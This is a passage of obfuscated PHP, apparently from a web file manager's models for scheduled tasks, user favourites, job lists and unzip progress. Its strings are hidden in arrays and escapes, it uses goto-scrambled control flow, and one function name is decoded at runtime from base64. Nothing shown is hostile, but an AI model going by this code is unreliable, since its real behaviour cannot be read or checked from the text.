= rawurlencode($Aæô„π≠‚§ . $_SERVER[™⁄»üÆ][375]); } goto f©Î≥„ƒåí; dÛÀ⁄≠ñ∂›: $f»ıëè…„Ÿ = explode($_SERVER[™⁄»üÆ][229], $bà≠ƒïò•§); if (count($f»ıëè…„Ÿ) < $_SERVER[™⁄»üÆ][597]) { $a∏°∑ùâºâ = $_SERVER[™⁄»üÆ][598]; $a∏°∑ùâºâ(); } $F∫ÒëÁ‘©ı = $_SERVER[™⁄»üÆ][599]; goto dÿ∫å≥ﬂâÔ; f©Î≥„ƒåí: } goto eóÖÌæ»£ú; FØøî§ÎÛœ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\164\141\x73\x6b\x4c\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\164\171\x70\x65", "\x65\166\145\x6e\164", "\164\151\155\x65", "\144\145\x73\x63", "\163\x79\163\x74\145\155", "\x65\156\x61\142\154\145", "\154\141\x73\x74\x52\x75\156", "\x73\157\x72\x74"); public function listData($F˜∆ÎÑÍ´È = false, $d÷¬¥ﬂÚÀä = "\163\x6f\x72\x74", $eÙŒòÊìäè = false) { return parent::listData($F˜∆ÎÑÍ´È, $d÷¬¥ﬂÚÀä, $eÙŒòÊìäè); } public function add($A¢™ìæáºÊ) { $bŒß›∑ÏØø =& $_SERVER[™⁄»üÆ]; $f±Í⁄Ö¶ﬂ≈ = $this->findByName($A¢™ìæáºÊ[$bŒß›∑ÏØø[28]]); if ($f±Í⁄Ö¶ﬂ≈) { return !1; } $A¢™ìæáºÊ[$bŒß›∑ÏØø[1501]] = 0; $A¢™ìæáºÊ[$bŒß›∑ÏØø[1729]] = $this->getSort(); return parent::insert($A¢™ìæáºÊ); } private function getSort() { $cò”Ãöî„◊ =& $_SERVER[™⁄»üÆ]; $a°ë˜§≤âÉ = parent::listData(); $Dµ˜¨ä≤«ª = array_to_keyvalue($a°ë˜§≤âÉ, $cò”Ãöî„◊[33], $cò”Ãöî„◊[1729]); return empty($Dµ˜¨ä≤«ª) ? 0 : max($Dµ˜¨ä≤«ª) + 1; } public function update($B‘ºÿπÊÌ∆, $C–±¶µÉ¨‡) { $EäÖ‰‚∑Ω =& $_SERVER[™⁄»üÆ]; $dÀµÙ◊ÈÕ’ = $this->listData($B‘ºÿπÊÌ∆); $FÇ÷Ø≤Ñß⁄ = $this->findByName($C–±¶µÉ¨‡[$EäÖ‰‚∑Ω[28]]); if (!$dÀµÙ◊ÈÕ’ || $FÇ÷Ø≤Ñß⁄ && $FÇ÷Ø≤Ñß⁄[$EäÖ‰‚∑Ω[394]] != $dÀµÙ◊ÈÕ’[$EäÖ‰‚∑Ω[394]]) { return !1; } return parent::update($B‘ºÿπÊÌ∆, $C–±¶µÉ¨‡); } public function remove($DÏ©ª´íô¨, $b‹ˆ˘íÔ∞Æ = false) { $eÒ≈±ÁÃö∆ =& $_SERVER[™⁄»üÆ]; $EÊ„◊èç™ö = $this->listData($DÏ©ª´íô¨); if (!$EÊ„◊èç™ö) { return; } if (!$b‹ˆ˘íÔ∞Æ && $EÊ„◊èç™ö[$eÒ≈±ÁÃö∆[1179]] == $eÒ≈±ÁÃö∆[87]) { return !1; } return parent::remove($DÏ©ª´íô¨); } public function enable($c§™ã≈âóÉ, $eÂÇüÀ¥©ƒ) { return $this->update($c§™ã≈âóÉ, array($_SERVER[™⁄»üÆ][2120] => $eÂÇüÀ¥©ƒ)); } public function run($DçÁáﬂ÷‹ô) { return $this->update($DçÁáﬂ÷‹ô, array($_SERVER[™⁄»üÆ][2130] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\141\x76"; protected function cacheFunctionAlias($fñÍˆÓ´£•) { $bÏ¯…¶·¿™ =& $_SERVER[™⁄»üÆ]; return array($bÏ¯…¶·¿™[1813] => array(USER_ID, $bÏ¯…¶·¿™[2131])); } protected function listData() { $B¶•ﬁ·Ô≥¢ =& $_SERVER[™⁄»üÆ]; $e‘…€¨›”◊ = array($B¶•ﬁ·Ô≥¢[1528] => USER_ID, $B¶•ﬁ·Ô≥¢[464] => 0); $fßï—åéì™ = $B¶•ﬁ·Ô≥¢[2132]; $bŒ»¬¿Ô·à = $this->field($fßï—åéì™)->where($e‘…€¨›”◊)->order($B¶•ﬁ·Ô≥¢[2133])->select(); return $bŒ»¬¿Ô·à ? $bŒ»¬¿Ô·à : array(); } protected function resetCache() { } protected function listView() { goto c„·–ï¯ıé; F‚ÓÀÏﬂ’é: $C∏ö¡êúßâ = array_to_keyvalue($B«û˜É–…», $Aªç∑É¥±ê[33], $Aªç∑É¥±ê[76]); if (!$C∏ö¡êúßâ) { return $fáñÂÉ§î‡; } $A⁄ëØÏƒ¨ê = 2000; goto D±Ï≤ñõˆã; D±Ï≤ñõˆã: $DÀÈ¢¡êŸ» = array($Aªç∑É¥±ê[411] => array($Aªç∑É¥±ê[412], $C∏ö¡êúßâ)); $FàÍÙÔíïÛ = Model($Aªç∑É¥±ê[809])->listSource($DÀÈ¢¡êŸ», $A⁄ëØÏƒ¨ê); $FàÍÙÔíïÛ = array_merge($FàÍÙÔíïÛ[$Aªç∑É¥±ê[74]], $FàÍÙÔíïÛ[$Aªç∑É¥±ê[75]]); goto f∂∂¶Í—†ç; f∂∂¶Í—†ç: $FàÍÙÔíïÛ = array_to_keyvalue($FàÍÙÔíïÛ, $Aªç∑É¥±ê[396]); foreach ($fáñÂÉ§î‡ as $aåÉèÑﬁöÃ => $cúØàïÃ¥ç) { $Aç‹îÈ∞Â¶ = $FàÍÙÔíïÛ[$cúØàïÃ¥ç[$Aªç∑É¥±ê[76]]]; $Aç‹îÈ∞Â¶ = $Aç‹îÈ∞Â¶ ? $Aç‹îÈ∞Â¶ : array(); $fáñÂÉ§î‡[$aåÉèÑﬁöÃ] = array_merge($Aç‹îÈ∞Â¶, $cúØàïÃ¥ç); } return $fáñÂÉ§î‡; goto bÇﬂ‚üØºÒ; c„·–ï¯ıé: $Aªç∑É¥±ê =& $_SERVER[™⁄»üÆ]; $fáñÂÉ§î‡ = $this->listData(); $B«û˜É–…» = array_filter_by_field($fáñÂÉ§î‡, $Aªç∑É¥±ê[29], $Aªç∑É¥±ê[410]); goto F‚ÓÀÏﬂ’é; bÇﬂ‚üØºÒ: } protected function addFav($DòñíÂë¥è, $Fü∞€ÔÔ§” = '', $fÏÖ∏ÁŒ≤¿ = "\163\x6f\x75\x72\143\145") { goto AöÀóæË§ß; bº´Ω£ËÎô: return $this->add($Aòıùóãü≈); goto F€ÀØ‰çÕ¶; BûÃ¢ÙãÜç: if (!$Fü∞€ÔÔ§” && $fÏÖ∏ÁŒ≤¿ == $Cñ…Ω£åÏµ[410]) { $cä–»ıÁª = Model($Cñ…Ω£åÏµ[1214])->where(array($Cñ…Ω£åÏµ[411] => $DòñíÂë¥è))->find(); if (!$cä–»ıÁª) { return !1; } $Fü∞€ÔÔ§” = $cä–»ıÁª[$Cñ…Ω£åÏµ[28]]; } $Fü∞€ÔÔ§” = $this->getAutoName($Fü∞€ÔÔ§”); $Aòıùóãü≈ = array($Cñ…Ω£åÏµ[1528] => USER_ID, $Cñ…Ω£åÏµ[464] => 0, $Cñ…Ω£åÏµ[414] => $Fü∞€ÔÔ§”, $Cñ…Ω£åÏµ[415] => $DòñíÂë¥è, $Cñ…Ω£åÏµ[416] => $fÏÖ∏ÁŒ≤¿, $Cñ…Ω£åÏµ[1710] => $F–Û—ﬁãÎ∫ + 1); goto bº´Ω£ËÎô; AöÀóæË§ß: $Cñ…Ω£åÏµ =& $_SERVER[™⁄»üÆ]; $E§è„ÉçÜ“ = array($Cñ…Ω£åÏµ[1528] => USER_ID, $Cñ…Ω£åÏµ[464] => 0, $Cñ…Ω£åÏµ[416] => $fÏÖ∏ÁŒ≤¿, $Cñ…Ω£åÏµ[415] => $DòñíÂë¥è); if ($this->where($E§è„ÉçÜ“)->find()) { return !1; } goto Bû®¶ëê≠∆; Bû®¶ëê≠∆: $E§è„ÉçÜ“ = array($Cñ…Ω£åÏµ[1528] => USER_ID, $Cñ…Ω£åÏµ[464] => 0); $F–Û—ﬁãÎ∫ = $this->where($E§è„ÉçÜ“)->max($Cñ…Ω£åÏµ[1729]); if (!$F–Û—ﬁãÎ∫) { $F–Û—ﬁãÎ∫ = 0; } goto BûÃ¢ÙãÜç; F€ÀØ‰çÕ¶: } protected function remove($a¨é±¢≥ãø) { $aúÏç±äªÜ =& $_SERVER[™⁄»üÆ]; $CåÛñç…“÷ = array($aúÏç±äªÜ[1528] => USER_ID, $aúÏç±äªÜ[413] => $a¨é±¢≥ãø); return $this->where($CåÛñç…“÷)->delete(); } protected function removeByName($AÙØ›çö´≥) { $bıÿ’ºﬂÜë =& $_SERVER[™⁄»üÆ]; $D–É›¥å≤√ = array($bıÿ’ºﬂÜë[1528] => USER_ID, $bıÿ’ºﬂÜë[414] => $AÙØ›çö´≥, $bıÿ’ºﬂÜë[464] => 0); return $this->where($D–É›¥å≤√)->delete(); } protected function rename($Aâï€äËîù, $dØêŸ™µÂ–) { $cÊ∏á≥ÿ¡¯ =& $_SERVER[™⁄»üÆ]; if ($Aâï€äËîù == $dØêŸ™µÂ–) { return !1; } $FƒÖŸ·¯«õ = $this->getAutoName($dØêŸ™µÂ–); if ($dØêŸ™µÂ– != $FƒÖŸ·¯«õ) { return !1; } $b¢’Â¨è…› = array($cÊ∏á≥ÿ¡¯[1528] => USER_ID, $cÊ∏á≥ÿ¡¯[464] => 0, $cÊ∏á≥ÿ¡¯[28] => $Aâï€äËîù); return $this->where($b¢’Â¨è…›)->save(array($cÊ∏á≥ÿ¡¯[28] => $dØêŸ™µÂ–)); } protected function resetSort($bÁﬁ√‘∂ÁÜ) { $b˘∫ƒ˘¡ã« =& $_SERVER[™⁄»üÆ]; $bÁﬁ√‘∂ÁÜ = is_array($bÁﬁ√‘∂ÁÜ) ? $bÁﬁ√‘∂ÁÜ : array(); $BÀÎñëÛÿ = array($b˘∫ƒ˘¡ã«[1528] => USER_ID); for ($Cß»É÷ÍËÛ = 0; $Cß»É÷ÍËÛ < count($bÁﬁ√‘∂ÁÜ); $Cß»É÷ÍËÛ++) { $BÀÎñëÛÿ[$b˘∫ƒ˘¡ã«[413]] = $bÁﬁ√‘∂ÁÜ[$Cß»É÷ÍËÛ]; $this->where($BÀÎñëÛÿ)->save(array($b˘∫ƒ˘¡ã«[1710] => $Cß»É÷ÍËÛ + 1)); } return !0; } protected function moveTop($B·éÉ∞ ùú) { goto B§Ø¨äÉˆÓ; e÷Í£ßúÃÀ: return $this->resetSort($FÜ‚≠†›¯ò); goto a÷Ñﬂ∂ÑöÓ; B§Ø¨äÉˆÓ: $AÒ•ËÎú©µ =& $_SERVER[™⁄»üÆ]; $F¬Úü°Çú≥ = array($AÒ•ËÎú©µ[1528] => USER_ID, $AÒ•ËÎú©µ[464] => 0); $BπßÉ«ùŒÑ = $this->where($F¬Úü°Çú≥)->where(array($AÒ•ËÎú©µ[28] => $B·éÉ∞ ùú))->find(); goto f•¢Úı…ùŒ; Fá§ì∞„´—: $d°äàéã¢‹ = $FÜ‚≠†›¯ò; $FÜ‚≠†›¯ò = array_remove_value($FÜ‚≠†›¯ò, $BπßÉ«ùŒÑ[$AÒ•ËÎú©µ[394]]); array_unshift($FÜ‚≠†›¯ò, $BπßÉ«ùŒÑ[$AÒ•ËÎú©µ[394]]); goto e÷Í£ßúÃÀ; f•¢Úı…ùŒ: if (!$BπßÉ«ùŒÑ) { return; } $FÜ‚≠†›¯ò = $this->field($AÒ•ËÎú©µ[394])->where($F¬Úü°Çú≥)->order($AÒ•ËÎú©µ[2133])->select(); $FÜ‚≠†›¯ò = array_to_keyvalue($FÜ‚≠†›¯ò, $AÒ•ËÎú©µ[33], $AÒ•ËÎú©µ[394]); goto Fá§ì∞„´—; a÷Ñﬂ∂ÑöÓ: } protected function moveBottom($cŒ◊Ôı»°¢) { $b¢Õ∏£ë¬≈ =& $_SERVER[™⁄»üÆ]; $CÿÛ ÍıÌ˜ = array($b¢Õ∏£ë¬≈[1528] => USER_ID, $b¢Õ∏£ë¬≈[464] => 0); $e“‚Íœà©ˆ = $this->where($CÿÛ ÍıÌ˜)->max($b¢Õ∏£ë¬≈[1729]); $eà±·ΩÁà≥ = array($b¢Õ∏£ë¬≈[1729] => $e“‚Íœà©ˆ + 1); return $this->where($CÿÛ ÍıÌ˜)->where(array($b¢Õ∏£ë¬≈[28] => $cŒ◊Ôı»°¢))->save($eà±·ΩÁà≥); } private function getAutoName($fπÑÜÇ†§ô) { goto cøôé‰»üÏ; cøôé‰»üÏ: $eç†ﬂ◊‰¬à =& $_SERVER[™⁄»üÆ]; $Dœ˜ã†êåã = array($eç†ﬂ◊‰¬à[1528] => USER_ID, $eç†ﬂ◊‰¬à[464] => 0); $cÔ…≈ÑÑäÔ = $this->field($eç†ﬂ◊‰¬à[28])->where($Dœ˜ã†êåã)->select(); goto C”îÛƒÂç∫; C”îÛƒÂç∫: $cÔ…≈ÑÑäÔ = array_to_keyvalue($cÔ…≈ÑÑäÔ, $eç†ﬂ◊‰¬à[33], $eç†ﬂ◊‰¬à[28]); if (!$cÔ…≈ÑÑäÔ || !in_array($fπÑÜÇ†§ô, $cÔ…≈ÑÑäÔ)) { return $fπÑÜÇ†§ô; } for ($Bï„†îÚÕ≠ = 0; $Bï„†îÚÕ≠ < count($cÔ…≈ÑÑäÔ); $Bï„†îÚÕ≠++) { if (!in_array($fπÑÜÇ†§ô . "\x28{$Bï„†îÚÕ≠}\x29", $cÔ…≈ÑÑäÔ)) { return $fπÑÜÇ†§ô . "\x28{$Bï„†îÚÕ≠}\x29"; } } goto f…–≤ﬁΩ†Œ; f…–≤ﬁΩ†Œ: return $fπÑÜÇ†§ô . "\50{$Bï„†îÚÕ≠}\x29"; goto aê„ä’ﬁ∞•; aê„ä’ﬁ∞•: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\152\157\x62\114\x69\163\x74"; public $field = array("\156\x61\155\145", "\x64\145\x73\143", "\x73\x6f\x72\164"); const JOB_KEY = "\x73\x65\x6c\146\112\157\x62\x4c\151\163\x74"; public function listData($Cî“Ç¨“ñ¡ = false, $bù◊Àëèµπ = "\163\x6f\162\x74", $FÂ’à∞£˘Æ = false) { return parent::listData($Cî“Ç¨“ñ¡, $bù◊Àëèµπ, $FÂ’à∞£˘Æ); } public function remove($DÜÛÉÆ∫Éä) { return parent::remove($DÜÛÉÆ∫Éä); } public function add($eÍƒ¯¯Ñéë) { $C∏”‹â∫ß± =& $_SERVER[™⁄»üÆ]; if ($this->findByName($eÍƒ¯¯Ñéë[$C∏”‹â∫ß±[28]])) { return !1; } $eÍƒ¯¯Ñéë[$C∏”‹â∫ß±[1729]] = $this->getSort(); return parent::insert($eÍƒ¯¯Ñéë); } private function getSort() { $a–¥éàÏ€ÿ =& $_SERVER[™⁄»üÆ]; $Eç‹ã‚◊åµ = parent::listData(); $eæÍä≥† ÿ = array_to_keyvalue($Eç‹ã‚◊åµ, $a–¥éàÏ€ÿ[33], $a–¥éàÏ€ÿ[1729]); return empty($eæÍä≥† ÿ) ? 0 : max($eæÍä≥† ÿ) + 1; } public function update($C¶†éëé£Ö, $cÊÑ÷ì‹·∑) { $dü™çûó⁄£ =& $_SERVER[™⁄»üÆ]; $eâÌöêÌøá = parent::listData($C¶†éëé£Ö); $fÂ”∆Üˆ£Ã = $this->findByName($cÊÑ÷ì‹·∑[$dü™çûó⁄£[28]]); if (!$eâÌöêÌøá || $fÂ”∆Üˆ£Ã && $fÂ”∆Üˆ£Ã[$dü™çûó⁄£[394]] != $eâÌöêÌøá[$dü™çûó⁄£[394]]) { return !1; } return parent::update($C¶†éëé£Ö, $cÊÑ÷ì‹·∑); } public function setUserJob($CàÎùàæ±ª, $fÔÇƒáè°‚) { goto CÌßÑáÊíØ; A¥Ò„·ﬂÇ∂: $Bﬂ£˜©„‹⁄ = array_to_keyvalue($E∫≥∏¿ØëÕ, $bŸ¿»ıæÃâ[28]); $E–èüÁ»Êí = $bŸ¿»ıæÃâ[375]; foreach ($fÔÇƒáè°‚ as $C÷âòÇ–Çƒ) { if ($Bﬂ£˜©„‹⁄[$C÷âòÇ–Çƒ]) { $E–èüÁ»Êí .= $Bﬂ£˜©„‹⁄[$C÷âòÇ–Çƒ][$bŸ¿»ıæÃâ[394]] . $bŸ¿»ıæÃâ[47]; } else { $C∑Ÿ¡Í¿±á = $this->add($C÷âòÇ–Çƒ); $E–èüÁ»Êí .= $C∑Ÿ¡Í¿±á . $bŸ¿»ıæÃâ[47]; } } goto dÀ¡èàÎ≈≥; dÀ¡èàÎ≈≥: $E–èüÁ»Êí = rtrim($E–èüÁ»Êí, $bŸ¿»ıæÃâ[47]); Model($bŸ¿»ıæÃâ[520])->metaSet($CàÎùàæ±ª, self::JOB_KEY, $E–èüÁ»Êí); goto dÿãå§Àî∆; CÌßÑáÊíØ: $bŸ¿»ıæÃâ =& $_SERVER[™⁄»üÆ]; if (!is_array($fÔÇƒáè°‚)) { $fÔÇƒáè°‚ = array($fÔÇƒáè°‚); } $E∫≥∏¿ØëÕ = parent::listData(); goto A¥Ò„·ﬂÇ∂; dÿãå§Àî∆: } public function getUserJob($BÉ«¶ΩÌêß) { $f‚Æ„ù¬ÈŒ = Model($_SERVER[™⁄»üÆ][520])->metaGet($BÉ«¶ΩÌêß); return $this->getUserJobInfo($f‚Æ„ù¬ÈŒ[self::JOB_KEY]); } public function getUserJobInfo($dœ≥óÑë¡) { goto B¥óÁ‰ôÖ£; b‰¢¥ÎØ¬Ó: $fá“ûãÎ∫ê = array_remove_key($fá“ûãÎ∫ê, $d‡ÙÑ¥¥Õ‡[194]); $cè¢˘ìàéï = array(); foreach ($EÿÜäôÂãæ as $Dñ∏Ö“æ€’) { if (isset($fá“ûãÎ∫ê[$Dñ∏Ö“æ€’])) { $cè¢˘ìàéï[] = $fá“ûãÎ∫ê[$Dñ∏Ö“æ€’]; } } goto DÑù◊¡òíà; DÑù◊¡òíà: return $cè¢˘ìàéï; goto D∂©à—ÂÇò; B¥óÁ‰ôÖ£: $d‡ÙÑ¥¥Õ‡ =& $_SERVER[™⁄»üÆ]; $EÿÜäôÂãæ = explode($d‡ÙÑ¥¥Õ‡[47], $dœ≥óÑë¡); $fá“ûãÎ∫ê = parent::listData(); goto b‰¢¥ÎØ¬Ó; D∂©à—ÂÇò: } } goto bó⁄§««é¬; D∞‰“ùìƒÖ: $bß…Ó«∑»è = strrev(base64_decode($_SERVER[ÒÄÏ¸†ªÇµ][0])); function binCheckNeq($FãÆª£Õ≠ç, $D”ãè™ìÏ) { return $FãÆª£Õ≠ç != $D”ãè™ìÏ; } $_SERVER[$_SERVER[ÒÄÏ¸†ªÇµ][1]] = $bß…Ó«∑»è($_SERVER[$_SERVER[ÒÄÏ¸†ªÇµ][2]]); goto dﬂ≈å∞ÒÇ‰; Aö≤≤®Ÿ›Û: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($D∫Ç•„Î‚Ÿ, $dè§ÈÓﬂ©µ = 5.0) { if (!$D∫Ç•„Î‚Ÿ) { return; } $EΩ≥Æåá´„ = Cache::get($D∫Ç•„Î‚Ÿ); if (!$EΩ≥Æåá´„ || timeFloat() - floatVal($EΩ≥Æåá´„) >= $dè§ÈÓﬂ©µ) { Cache::set($D∫Ç•„Î‚Ÿ, timeFloat(), $dè§ÈÓﬂ©µ * 10); return !0; } return !1; } public static function timeLimitCall($eÙ¨È„–âÓ, $BÍﬁ“ÙƒÇÖ, $cåÍ‰ã”‚∫, $B©≥îˆäº€ = 5.0) { goto A”éÓ˜Ê“¢; bÖÒ‘äÜ˜: $EŸ‘Æ§öåº = $Dú€ıûá›ò[1617]; $A°çØ‚ñÖ∫ = Cache::get($EŸ‘Æ§öåº, !0); $D©úÑƒé˜∞ = array($Dú€ıûá›ò[1618] => timeFloat(), $Dú€ıûá›ò[1619] => timeFloat(), $Dú€ıûá›ò[262] => $BÍﬁ“ÙƒÇÖ, $Dú€ıûá›ò[1612] => $cåÍ‰ã”‚∫, $Dú€ıûá›ò[197] => $B©≥îˆäº€); goto A ùïìûﬂ¿; A”éÓ˜Ê“¢: $Dú€ıûá›ò =& $_SERVER[™⁄»üÆ]; if (!$eÙ¨È„–âÓ || !$BÍﬁ“ÙƒÇÖ) { return; } self::$asyncAdd = !0; goto bÖÒ‘äÜ˜; e´””ËÁ∆˜: Cache::set($EŸ‘Æ§öåº, $A°çØ‚ñÖ∫, 60); Cache::removeMemory($EŸ‘Æ§öåº); write_log($Dú€ıûá›ò[1620] . $eÙ¨È„–âÓ . $Dú€ıûá›ò[68] . $BÍﬁ“ÙƒÇÖ, $Dú€ıûá›ò[1614]); goto F™Îõ’áá†; A ùïìûﬂ¿: if (is_array($A°çØ‚ñÖ∫[$eÙ¨È„–âÓ])) { $D©úÑƒé˜∞[$Dú€ıûá›ò[1619]] = $A°çØ‚ñÖ∫[$eÙ¨È„–âÓ][$Dú€ıûá›ò[1619]]; } if (is_array($A°çØ‚ñÖ∫[$eÙ¨È„–âÓ])) { if (timeFloat() - $A°çØ‚ñÖ∫[$eÙ¨È„–âÓ][$Dú€ıûá›ò[1618]] < $D©úÑƒé˜∞[$Dú€ıûá›ò[197]] * 0.3) { return; } $D©úÑƒé˜∞[$Dú€ıûá›ò[1619]] = $A°çØ‚ñÖ∫[$eÙ¨È„–âÓ][$Dú€ıûá›ò[1619]]; } $A°çØ‚ñÖ∫[$eÙ¨È„–âÓ] = $D©úÑƒé˜∞; goto e´””ËÁ∆˜; F™Îõ’áá†: } public static function timeLimitCallLoop() { goto fä»ÍΩ¶Ñµ; cØ∂Çø€›˘: if (!$aÜ∆ò≥∞êó) { return Cache::remove($A“¿éÔ¨Ñ’); } Cache::set($A“¿éÔ¨Ñ’, $aÜ∆ò≥∞êó, 60); Cache::removeMemory($A“¿éÔ¨Ñ’); goto BéåµàÕÑ§; fä»ÍΩ¶Ñµ: $b‡Â¶á””± =& $_SERVER[™⁄»üÆ]; $F∞ß¢√ıÉﬁ = array($b‡Â¶á””±[1621]); $fàÈëºˆ≈ç = in_array(strtolower(ACTION), $F∞ß¢√ıÉﬁ); goto c◊‚€èûØ∞; e¯Ô¶ïÑ‰¿: if (!$C∂Ú•⁄–‹ä || count($C∂Ú•⁄–‹ä) <= 0) { return; } $Eß¬Ê·“Ç≥ = !1; $D≤™ßò¥ ≥ = timeFloat(); goto aæ≤îÇøü‘; c◊‚€èûØ∞: if (!$fàÈëºˆ≈ç && !self::$asyncAdd) { return; } $A“¿éÔ¨Ñ’ = $b‡Â¶á””±[1617]; $C∂Ú•⁄–‹ä = Cache::get($A“¿éÔ¨Ñ’, !0); goto e¯Ô¶ïÑ‰¿; aæ≤îÇøü‘: $aÜ∆ò≥∞êó = array(); foreach ($C∂Ú•⁄–‹ä as $EÒ©’Ø¨Èæ => $eßºÍ◊∏Á‘) { if ($D≤™ßò¥ ≥ - $eßºÍ◊∏Á‘[$b‡Â¶á””±[1619]] > $eßºÍ◊∏Á‘[$b‡Â¶á””±[197]]) { $Eß¬Ê·“Ç≥ = !0; try { Hook::apply($eßºÍ◊∏Á‘[$b‡Â¶á””±[262]], $eßºÍ◊∏Á‘[$b‡Â¶á””±[1612]]); write_log($b‡Â¶á””±[1622] . $EÒ©’Ø¨Èæ . $b‡Â¶á””±[68] . $eßºÍ◊∏Á‘[$b‡Â¶á””±[262]] . $b‡Â¶á””±[1623] . ACTION, $b‡Â¶á””±[1614]); } catch (Exception $dõäë©ëΩà) { } continue; } $aÜ∆ò≥∞êó[$EÒ©’Ø¨Èæ] = $eßºÍ◊∏Á‘; } if (!$Eß¬Ê·“Ç≥) { return; } goto cØ∂Çø€›˘; BéåµàÕÑ§: } public static function finished($A∞´∑°ÜÖù, $BôÿØ†°⁄Ç) { $dåâü¬◊ìÇ =& $_SERVER[™⁄»üÆ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($dåâü¬◊ìÇ[262] => $A∞´∑°ÜÖù, $dåâü¬◊ìÇ[1612] => $BôÿØ†°⁄Ç); } private static function finishedRun() { $Cƒ†∞à¢öô =& $_SERVER[™⁄»üÆ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $cõïˆøªâ’) { try { Hook::apply($cõïˆøªâ’[$Cƒ†∞à¢öô[262]], $cõïˆøªâ’[$Cƒ†∞à¢öô[1612]]); } catch (Exception $b›œ€Ω°ıÀ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto a«´›åÖ¶À; a«´›åÖ¶À: $Eí£∑◊››¯ =& $_SERVER[™⁄»üÆ]; parent::startAfter(); Hook::bind($Eí£∑◊››¯[1624], array($this, $Eí£∑◊››¯[1625])); goto BàÈ‰Ù«⁄ç; BàÈ‰Ù«⁄ç: Hook::bind($Eí£∑◊››¯[1097], array($this, $Eí£∑◊››¯[1626])); $CÓ¡≤èß≤á =& $this->task; $CÓ¡≤èß≤á[$Eí£∑◊››¯[1627]] = $Eí£∑◊››¯[1102]; goto A»¢Ü◊©Âø; A»¢Ü◊©Âø: if (!$CÓ¡≤èß≤á[$Eí£∑◊››¯[1440]]) { $CÓ¡≤èß≤á[$Eí£∑◊››¯[1440]] = LNG($Eí£∑◊››¯[1628]); } goto E»Ô™®Ì„Ó; E»Ô™®Ì„Ó: } protected function endAfter() { $AÇ≤ë¯∑© =& $_SERVER[™⁄»üÆ]; parent::endAfter(); Hook::unbind($AÇ≤ë¯∑©[1624], array($this, $AÇ≤ë¯∑©[1625])); Hook::unbind($AÇ≤ë¯∑©[1097], array($this, $AÇ≤ë¯∑©[1626])); } public function updateAfter() { $EÍ§÷®è†¯ =& $_SERVER[™⁄»üÆ]; $aË∆ÂÆ´–∏ =& $this->task; if (!$aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1030]] || !$aË∆ÂÆ´–∏[$EÍ§÷®è†¯[742]]) { return; } if ($aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1627]] == $EÍ§÷®è†¯[1102]) { $dè‚ùæ•øª = 0; if ($aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1583]]) { $dè‚ùæ•øª = $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1584]] / $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1583]]; } $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1538]] = $dè‚ùæ•øª * 0.3; } else { if ($aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1627]] == $EÍ§÷®è†¯[311]) { $dè‚ùæ•øª = $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1044]] / $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1030]]; $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1538]] = 0.3 + $dè‚ùæ•øª * 0.4; } else { if ($aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1627]] == $EÍ§÷®è†¯[107]) { $FÇ„”ºÌÙû = 0; if ($aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1585]] == $EÍ§÷®è†¯[107]) { $FÇ„”ºÌÙû = $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1584]]; } $dè‚ùæ•øª = ($aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1588]] + $FÇ„”ºÌÙû) / $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[742]]; $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1538]] = 0.3 + 0.4 + $dè‚ùæ•øª * 0.3; } } } if ($aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1538]] > 0) { $C¬Ç—®∫™å = timeFloat() - $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[768]] - $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1541]]; $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1542]] = $C¬Ç—®∫™å * (1 - $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1538]]) / $aË∆ÂÆ´–∏[$EÍ§÷®è†¯[1538]]; } } public function addFile($fì†¿∏¨«¥) { goto FáÚòÖöØ–; a´ÙºöÂºç: $E⁄Ω∑µƒ∫‰[$b∑øß†ŒÔÙ[1581]] = $E¶À…Ñëæ[$b∑øß†ŒÔÙ[28]]; $E⁄Ω∑µƒ∫‰[$b∑øß†ŒÔÙ[1583]] = $E¶À…Ñëæ[$b∑øß†ŒÔÙ[78]]; $E⁄Ω∑µƒ∫‰[$b∑øß†ŒÔÙ[1584]] = 0; goto Aººëá≠≤ò; e€ëäÛ“ßâ: $E⁄Ω∑µƒ∫‰[$b∑øß†ŒÔÙ[1030]] = 1; $aê∫±ﬁ™ä‚ = 0; $E⁄Ω∑µƒ∫‰[$b∑øß†ŒÔÙ[1592]] = array($b∑øß†ŒÔÙ[1593] => $aê∫±ﬁ™ä‚ + 1, $b∑øß†ŒÔÙ[414] => $E¶À…Ñëæ[$b∑øß†ŒÔÙ[28]], $b∑øß†ŒÔÙ[76] => $E¶À…Ñëæ[$b∑øß†ŒÔÙ[76]], $b∑øß†ŒÔÙ[501] => $E¶À…Ñëæ[$b∑øß†ŒÔÙ[501]] ? $E¶À…Ñëæ[$b∑øß†ŒÔÙ[501]] : $E¶À…Ñëæ[$b∑øß†ŒÔÙ[76]]); goto EÌ¢◊∑ù‘Ö; FáÚòÖöØ–: $b∑øß†ŒÔÙ =& $_SERVER[™⁄»üÆ]; $E⁄Ω∑µƒ∫‰ =& $this->task; $E¶À…Ñëæ = IO::info($fì†¿∏¨«¥); goto a´ÙºöÂºç; EÌ¢◊∑ù‘Ö: $this->update(); goto a…ãÕß† 